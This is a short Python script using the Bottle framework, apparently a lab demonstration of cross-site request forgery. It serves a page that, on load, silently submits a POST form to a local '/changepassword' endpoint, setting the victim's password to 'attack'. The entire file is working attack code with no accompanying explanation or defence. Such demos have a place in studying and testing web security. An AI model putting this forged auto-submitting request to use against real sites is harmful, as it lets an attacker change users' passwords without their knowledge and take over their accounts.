#!/usr/bin/python
# -*- coding: utf-8 -*-

from bottle import route
from bottle import run
from bottle import request


TARGET_URL = 'http://localhost:8000/changepassword'


@route('/')
def index():
    html = '<body onload="document.forms[0].submit()">'
    html += '<form method="POST" action="'
    html += TARGET_URL
    html += '">'
    html += '<input type="text" name="password" value="attack">'
    html += '</form>'
    html += '</body>'
    return html


def main():
    run(host='localhost', port=8888, debug=True)


if __name__ == '__main__':
    main()
